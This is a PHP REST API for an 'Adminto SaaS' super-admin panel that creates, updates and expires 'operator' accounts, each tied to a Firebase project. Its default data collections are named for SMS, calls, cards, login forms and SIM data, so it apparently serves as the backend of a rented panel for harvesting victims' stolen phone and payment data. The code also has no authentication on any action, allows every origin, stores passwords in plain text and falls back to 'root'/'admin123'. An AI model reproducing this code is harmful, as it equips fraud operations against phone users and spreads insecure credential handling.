<?php
/**
 * Adminto SaaS - Super Admin MySQL REST API
 * Supports CRUD operations for Operator Accounts & Database Projects
 */

$host = getenv('DB_HOST') ?: 'localhost';
$dbname = getenv('DB_NAME') ?: 'adminto_saas_db';
$user = getenv('DB_USER') ?: 'root';
$pass = getenv('DB_PASSWORD') ?: 'admin123';
$port = getenv('DB_PORT') ?: '3306';

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

try {
    $dsn = "mysql:host={$host};port={$port};dbname={$dbname};charset=utf8mb4";
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Database connection failed: ' . $e->getMessage()]);
    exit;
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';
$input = json_decode(file_get_contents('php://input'), true) ?? $_POST;

// ======================================================
// AUTO-MIGRATION: Add missing columns if not present
// ======================================================
$migrations = [
    "ALTER TABLE operators ADD COLUMN firebase_database_url VARCHAR(512) DEFAULT '' AFTER firebase_api_key",
    "ALTER TABLE operators ADD COLUMN collection_sms VARCHAR(100) DEFAULT 'user_sms' AFTER org_id",
    "ALTER TABLE operators ADD COLUMN collection_calls VARCHAR(100) DEFAULT 'calls' AFTER collection_sms",
    "ALTER TABLE operators ADD COLUMN collection_cards VARCHAR(100) DEFAULT 'Card' AFTER collection_calls",
    "ALTER TABLE operators ADD COLUMN collection_forms VARCHAR(100) DEFAULT 'login' AFTER collection_cards",
    "ALTER TABLE operators ADD COLUMN collection_sims VARCHAR(100) DEFAULT 'user_data' AFTER collection_forms",
];
foreach ($migrations as $sql) {
    try { $pdo->exec($sql); } catch (Exception $ex) { /* Column already exists */ }
}

switch ($action) {
    // 1. GET ALL OPERATORS
    case 'get_operators':
        try {
            $stmt = $pdo->query("SELECT
                id,
                username,
                email,
                full_name as fullName,
                role,
                expiry_date as expiryDate,
                is_active as isActive,
                firebase_project_id as firebaseProject,
                firebase_api_key as firebaseApiKey,
                firebase_database_url as firebaseDatabaseUrl,
                firebase_auth_domain as firebaseAuthDomain,
                storage_bucket as storageBucket,
                app_id as appId,
                org_id as orgId,
                collection_sms as collectionSms,
                collection_calls as collectionCalls,
                collection_cards as collectionCards,
                collection_forms as collectionForms,
                collection_sims as collectionSims
            FROM operators ORDER BY created_at DESC");
            $operators = $stmt->fetchAll();
            echo json_encode(['success' => true, 'operators' => $operators]);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        break;

    // 2. ADD NEW OPERATOR
    case 'add_operator':
        $username         = trim($input['username'] ?? '');
        $password         = trim($input['password'] ?? '');
        $fullName         = trim($input['fullName'] ?? $username);
        $role             = trim($input['role'] ?? 'operator');
        $expiryDate       = trim($input['expiryDate'] ?? '2026-12-31');
        $firebaseProject  = trim($input['firebaseProject'] ?? 'adminto-op-custom');
        $firebaseApiKey   = trim($input['firebaseApiKey'] ?? '');
        $firebaseDatabaseUrl = trim($input['firebaseDatabaseUrl'] ?? '');
        $firebaseAuthDomain  = trim($input['firebaseAuthDomain'] ?? '');
        $storageBucket    = trim($input['storageBucket'] ?? '');
        $appId            = trim($input['appId'] ?? '');
        $orgId            = trim($input['orgId'] ?? 'org_custom');
        $collSms          = trim($input['collectionSms'] ?? 'user_sms');
        $collCalls        = trim($input['collectionCalls'] ?? 'calls');
        $collCards        = trim($input['collectionCards'] ?? 'Card');
        $collForms        = trim($input['collectionForms'] ?? 'login');
        $collSims         = trim($input['collectionSims'] ?? 'user_data');

        if (empty($username) || empty($password)) {
            echo json_encode(['success' => false, 'error' => 'Username and password required']);
            exit;
        }

        try {
            $stmt = $pdo->prepare("INSERT INTO operators
                (username, email, password_hash, full_name, role, expiry_date,
                 firebase_project_id, firebase_api_key, firebase_database_url,
                 firebase_auth_domain, storage_bucket, app_id, org_id,
                 collection_sms, collection_calls, collection_cards, collection_forms, collection_sims)
                VALUES (:u, :e, :p, :f, :r, :ex, :fp, :ak, :du, :ad, :sb, :ai, :o,
                        :csms, :ccalls, :ccards, :cforms, :csims)");
            $stmt->execute([
                'u'      => $username,
                'e'      => $username . '@adminto.com',
                'p'      => $password,
                'f'      => $fullName,
                'r'      => $role,
                'ex'     => $expiryDate,
                'fp'     => $firebaseProject,
                'ak'     => $firebaseApiKey,
                'du'     => $firebaseDatabaseUrl,
                'ad'     => $firebaseAuthDomain,
                'sb'     => $storageBucket,
                'ai'     => $appId,
                'o'      => $orgId,
                'csms'   => $collSms,
                'ccalls' => $collCalls,
                'ccards' => $collCards,
                'cforms' => $collForms,
                'csims'  => $collSims,
            ]);
            echo json_encode(['success' => true, 'message' => 'Operator created successfully']);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        break;

    // 2B. UPDATE FIREBASE CONFIG + COLLECTION MAPPINGS
    case 'update_firebase_config':
        $id                  = $input['id'] ?? null;
        $username            = trim($input['username'] ?? '');
        $firebaseProject     = trim($input['firebaseProject'] ?? '');
        $firebaseApiKey      = trim($input['firebaseApiKey'] ?? '');
        $firebaseDatabaseUrl = trim($input['firebaseDatabaseUrl'] ?? '');
        $firebaseAuthDomain  = trim($input['firebaseAuthDomain'] ?? '');
        $storageBucket       = trim($input['storageBucket'] ?? '');
        $appId               = trim($input['appId'] ?? '');
        $collSms             = trim($input['collectionSms'] ?? '');
        $collCalls           = trim($input['collectionCalls'] ?? '');
        $collCards           = trim($input['collectionCards'] ?? '');
        $collForms           = trim($input['collectionForms'] ?? '');
        $collSims            = trim($input['collectionSims'] ?? '');

        try {
            $setClauses = "firebase_project_id = :fp, firebase_api_key = :ak, firebase_database_url = :du,
                           firebase_auth_domain = :ad, storage_bucket = :sb, app_id = :ai";
            $params = [
                'fp' => $firebaseProject, 'ak' => $firebaseApiKey, 'du' => $firebaseDatabaseUrl,
                'ad' => $firebaseAuthDomain, 'sb' => $storageBucket, 'ai' => $appId
            ];

            // Only update collection fields if they are provided
            if ($collSms !== '')    { $setClauses .= ", collection_sms = :csms";   $params['csms']   = $collSms; }
            if ($collCalls !== '')  { $setClauses .= ", collection_calls = :ccalls"; $params['ccalls'] = $collCalls; }
            if ($collCards !== '')  { $setClauses .= ", collection_cards = :ccards"; $params['ccards'] = $collCards; }
            if ($collForms !== '')  { $setClauses .= ", collection_forms = :cforms"; $params['cforms'] = $collForms; }
            if ($collSims !== '')   { $setClauses .= ", collection_sims = :csims";  $params['csims']  = $collSims; }

            if ($id) {
                $params['id'] = $id;
                $stmt = $pdo->prepare("UPDATE operators SET {$setClauses} WHERE id = :id");
            } else if ($username) {
                $params['u'] = $username;
                $stmt = $pdo->prepare("UPDATE operators SET {$setClauses} WHERE LOWER(username) = LOWER(:u)");
            } else {
                echo json_encode(['success' => false, 'error' => 'Operator ID or username required']);
                break;
            }
            $stmt->execute($params);
            echo json_encode(['success' => true, 'message' => 'Firebase credentials & collections updated']);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        break;

    // 3. EXTEND EXPIRATION DATE
    case 'extend_expiry':
        $id = $input['id'] ?? null;
        $expiryDate = $input['expiryDate'] ?? null;

        if (!$id || !$expiryDate) {
            echo json_encode(['success' => false, 'error' => 'Operator ID and expiry date required']);
            exit;
        }

        try {
            $stmt = $pdo->prepare("UPDATE operators SET expiry_date = :ex WHERE id = :id");
            $stmt->execute(['ex' => $expiryDate, 'id' => $id]);
            echo json_encode(['success' => true, 'message' => 'Expiration date updated']);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        break;

    // 4. DELETE OPERATOR
    case 'delete_operator':
        $id = $input['id'] ?? null;
        if (!$id) {
            echo json_encode(['success' => false, 'error' => 'Operator ID required']);
            exit;
        }

        try {
            $stmt = $pdo->prepare("DELETE FROM operators WHERE id = :id");
            $stmt->execute(['id' => $id]);
            echo json_encode(['success' => true, 'message' => 'Operator deleted']);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        break;

    // 5. CHANGE OPERATOR PASSWORD
    case 'change_password':
        $username = trim($input['username'] ?? '');
        $newPassword = trim($input['newPassword'] ?? '');

        if (empty($username) || empty($newPassword)) {
            echo json_encode(['success' => false, 'error' => 'Username and new password required']);
            exit;
        }

        try {
            $stmt = $pdo->prepare("UPDATE operators SET password_hash = :p WHERE LOWER(username) = LOWER(:u)");
            $stmt->execute(['p' => $newPassword, 'u' => $username]);
            echo json_encode(['success' => true, 'message' => 'Password updated successfully']);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        break;

    default:
        echo json_encode(['success' => false, 'error' => 'Invalid action']);
        break;
}
